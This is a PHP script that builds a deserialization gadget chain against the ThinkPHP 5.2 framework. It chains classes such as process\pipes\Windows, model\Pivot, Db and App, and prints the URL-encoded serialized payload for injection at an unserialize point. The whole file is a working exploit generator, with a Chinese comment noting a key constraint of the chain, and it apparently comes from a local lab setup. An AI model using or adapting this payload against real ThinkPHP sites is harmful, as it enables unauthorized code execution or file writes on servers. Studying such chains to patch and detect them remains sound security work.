<?php
namespace think;
class App{
    protected $runtimePath;
    public function __construct(string $rootPath = ''){
        $this->rootPath = $rootPath;
        $this->runtimePath = "D:/phpstudy/PHPTutorial/WWW/thinkphp/tp5.2/";
        $this->route = new \think\route\RuleName();
    }
}
class Db{
    protected $connection;
    protected $config;
    function __construct(){
        $this->config = ['query'=>'\think\Url'];
        $this->connection = new \think\App();
    }
}
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        # append键必须存在，并且与$this->data相同
        $this->append = ["lin"=>[]];
        $this->data = ["lin"=>new \think\Db()];
    }
}
namespace think\route;
class RuleName{

}
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    private $files = [];
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
//var_dump(new Windows());
echo urlencode(serialize(new Windows()));
?>